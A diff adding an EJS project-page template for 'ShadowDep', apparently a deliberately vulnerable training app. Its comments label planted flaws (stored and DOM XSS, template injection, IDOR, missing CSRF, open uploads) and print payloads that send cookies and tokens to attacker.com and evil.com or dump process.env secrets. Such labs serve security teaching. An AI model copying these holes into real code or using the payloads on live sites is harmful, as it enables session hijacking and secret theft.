@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <%# STORED XSS: project name unescaped in <title> — CWE-79 %>
+  <title><%- project.name %> — ShadowDep</title>
+  <!-- No CSP header -->
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: 'Segoe UI', Arial, sans-serif; background: #0f172a; color: #e2e8f0; }
+    .navbar {
+      background: rgba(30,41,59,0.95);
+      border-bottom: 1px solid rgba(255,255,255,0.08);
+      padding: 0 32px; height: 64px;
+      display: flex; align-items: center; justify-content: space-between;
+    }
+    .navbar-brand { font-size: 20px; font-weight: 700; color: #818cf8; text-decoration: none; }
+    .container { max-width: 900px; margin: 40px auto; padding: 0 24px; }
+    .card {
+      background: rgba(30,41,59,0.8);
+      border: 1px solid rgba(255,255,255,0.08);
+      border-radius: 16px; padding: 36px;
+    }
+    h1 { font-size: 28px; font-weight: 700; margin-bottom: 16px; }
+    .meta { display: flex; gap: 12px; margin-bottom: 24px; flex-wrap: wrap; }
+    .badge {
+      padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: 600;
+    }
+    .badge-active   { background: rgba(16,185,129,0.15); color: #10b981; }
+    .badge-high     { background: rgba(239,68,68,0.15);  color: #ef4444; }
+    .badge-medium   { background: rgba(99,102,241,0.15); color: #818cf8; }
+    .badge-critical { background: rgba(239,68,68,0.3);   color: #fca5a5; }
+    .badge-low      { background: rgba(100,116,139,0.15);color: #94a3b8; }
+    .badge-pending  { background: rgba(245,158,11,0.15); color: #f59e0b; }
+    .description { line-height: 1.7; color: #cbd5e1; margin-bottom: 28px; padding: 20px; background: rgba(0,0,0,0.2); border-radius: 8px; border-left: 3px solid #6366f1; }
+    .section-title { font-size: 16px; font-weight: 600; color: #94a3b8; margin-bottom: 12px; text-transform: uppercase; letter-spacing: .05em; }
+    .upload-form { display: flex; gap: 12px; align-items: center; margin-bottom: 24px; }
+    .upload-form input[type=file] { color: #94a3b8; font-size: 14px; }
+    .btn { padding: 10px 20px; border-radius: 8px; font-size: 14px; font-weight: 600; cursor: pointer; border: none; text-decoration: none; }
+    .btn-primary { background: linear-gradient(135deg,#6366f1,#8b5cf6); color: white; }
+    .btn-danger  { background: #ef4444; color: white; }
+    .btn-secondary { background: rgba(255,255,255,0.1); color: #e2e8f0; }
+    .ssti-box { background: rgba(245,158,11,0.1); border: 1px solid rgba(245,158,11,0.3); border-radius: 8px; padding: 16px; margin-top: 20px; color: #fbbf24; font-size: 13px; }
+    .actions { display: flex; gap: 12px; margin-top: 24px; }
+    .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-bottom: 24px; }
+    .info-item label { color: #64748b; font-size: 12px; text-transform: uppercase; letter-spacing: .05em; }
+    .info-item p { color: #e2e8f0; margin-top: 4px; }
+  </style>
+</head>
+<body>
+
+  <nav class="navbar">
+    <a href="/projects" class="navbar-brand">🌑 ShadowDep</a>
+    <%# Stored XSS in nav: username unescaped %>
+    <span style="color:#94a3b8; font-size:14px;"><%- user.username || 'Guest' %></span>
+  </nav>
+
+  <div class="container">
+    <div class="card">
+
+      <%# ════════════════════════════════════════════════════════════ %>
+      <%# STORED XSS: project.name rendered with <%- (unescaped)     %>
+      <%# Payload: <script>fetch('http://attacker.com/'+btoa(document.cookie))</script> %>
+      <%# ════════════════════════════════════════════════════════════ %>
+      <h1><%- project.name %></h1>
+
+      <div class="meta">
+        <span class="badge badge-<%= project.status %>">Status: <%= project.status %></span>
+        <span class="badge badge-<%= project.priority %>">Priority: <%= project.priority %></span>
+        <span style="color:#475569; font-size:13px;">ID: #<%= project.id %> — <a href="/projects/<%= project.id - 1 %>" style="color:#6366f1;">← Prev</a> | <a href="/projects/<%= project.id + 1 %>" style="color:#6366f1;">Next →</a></span>
+        <%# IDOR hint: sequential IDs, prev/next links with no ownership check %>
+      </div>
+
+      <div class="info-grid">
+        <div class="info-item">
+          <label>Owner User ID</label>
+          <p>#<%= project.user_id %></p><%# Leaks user_id — helps IDOR enumeration %>
+        </div>
+        <div class="info-item">
+          <label>Created</label>
+          <p><%= project.created_at %></p>
+        </div>
+      </div>
+
+      <p class="section-title">Description</p>
+      <div class="description">
+        <%# ════════════════════════════════════════════════════════════ %>
+        <%# STORED XSS: description rendered completely unescaped       %>
+        <%# Attacker creates a project with description:                %>
+        <%#   <script>document.location='//evil.com/?c='+document.cookie</script> %>
+        <%# or: <img src=x onerror="fetch('//evil.com/'+btoa(localStorage.getItem('token')))"> %>
+        <%# ════════════════════════════════════════════════════════════ %>
+        <%- project.description %>
+      </div>
+
+      <%# ════════════════════════════════════════════════════════════ %>
+      <%# SERVER-SIDE TEMPLATE INJECTION (SSTI) via EJS              %>
+      <%# The `userInput` variable comes from ?userInput= query param %>
+      <%# EJS renders <%- userInput %> without escaping              %>
+      <%# Payloads:                                                  %>
+      <%#   ?userInput=<%= process.env.JWT_SECRET %>                 %>
+      <%#   ?userInput=<%= process.env %>                            %>
+      <%#   ?userInput=<%= JSON.stringify(process.env) %>            %>
+      <%# ════════════════════════════════════════════════════════════ %>
+      <% if (typeof userInput !== 'undefined' && userInput) { %>
+        <div class="ssti-box">
+          <strong>⚠ Debug Info (FIXME: remove before production):</strong><br>
+          <%- userInput %><!-- SSTI: userInput rendered unescaped -->
+        </div>
+      <% } %>
+
+      <p class="section-title" style="margin-top:24px;">Upload Attachment</p>
+      <form class="upload-form" action="/projects/upload" method="POST" enctype="multipart/form-data">
+        <%# No CSRF token — CWE-352 %>
+        <input type="file" name="file"><!-- No type restriction — accepts .php, .sh, .exe -->
+        <button type="submit" class="btn btn-primary">Upload</button>
+      </form>
+      <p style="color:#475569; font-size:12px; margin-top:-8px; margin-bottom:16px;">
+        Uploaded files are publicly accessible at <code>/uploads/filename</code> with directory listing.
+      </p>
+
+      <div class="actions">
+        <a href="/projects" class="btn btn-secondary">← Back</a>
+        <button onclick="editProject(<%= project.id %>)" class="btn btn-primary">Edit Project</button>
+        <button onclick="deleteProject(<%= project.id %>)" class="btn btn-danger">Delete Project</button>
+      </div>
+
+    </div>
+  </div>
+
+  <script>
+    // DOM XSS: reading from URL hash
+    // Try: /projects/1#<img src=x onerror=alert(document.cookie)>
+    if (window.location.hash) {
+      var hashContent = document.createElement('div');
+      hashContent.innerHTML = decodeURIComponent(window.location.hash.slice(1)); // DOM XSS
+      document.querySelector('.container').appendChild(hashContent);
+    }
+
+    function deleteProject(id) {
+      if (!confirm('Delete project #' + id + '?')) return;
+      var token = localStorage.getItem('token'); // FIXME: Token in localStorage
+      fetch('/projects/' + id, {
+        method:  'DELETE',
+        headers: { 'Authorization': 'Bearer ' + token }
+      })
+      .then(function(r) { return r.json(); })
+      .then(function() { window.location.href = '/projects'; });
+    }
+
+    function editProject(id) {
+      var name = prompt('New project name:');
+      var desc = prompt('New description:');
+      if (!name) return;
+      var token = localStorage.getItem('token');
+      fetch('/projects/' + id, {
+        method:  'PUT',
+        headers: { 'Authorization': 'Bearer ' + token, 'Content-Type': 'application/json' },
+        body:    JSON.stringify({ name: name, description: desc })
+      })
+      .then(function() { location.reload(); });
+    }
+  </script>
+
+</body>
+</html>
